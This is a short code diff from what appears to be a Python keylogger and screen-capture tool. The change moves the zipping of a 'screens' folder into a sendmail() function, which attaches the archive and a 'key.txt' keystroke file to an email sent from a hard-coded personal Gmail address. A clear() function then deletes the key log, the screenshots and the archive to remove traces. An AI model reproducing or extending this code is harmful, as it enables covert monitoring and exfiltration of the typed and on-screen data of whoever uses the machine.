@@ -12,9 +12,6 @@ import PrintScreen
 path = os.path.dirname(os.path.abspath(__file__))
 script_path_key = os.path.join(path, 'key.txt')
 
-shutil.make_archive("screens", 'zip', "screens")
-zip_path = os.path.join(path, 'screens.zip')
-
 
 def sendmail():
     sender = "Jan.Adamczewski.Pawel@gmail.com"
@@ -33,6 +30,9 @@ def sendmail():
     encoders.encode_base64(part)
     part.add_header("Content-Disposition", f"attachment; filename={file}")
     msg.attach(part)
+
+    shutil.make_archive("screens", 'zip', "screens")
+    zip_path = os.path.join(path, 'screens.zip')
 
     with open(zip_path, "rb") as file:
         attachment = MIMEBase('application', 'zip')
@@ -55,6 +55,7 @@ def sendmail():
 
 
 def clear():
+    zip_path = os.path.join(path, 'screens.zip')
     Save_to_file.clear_key()
     PrintScreen.clear()
     os.remove(zip_path)
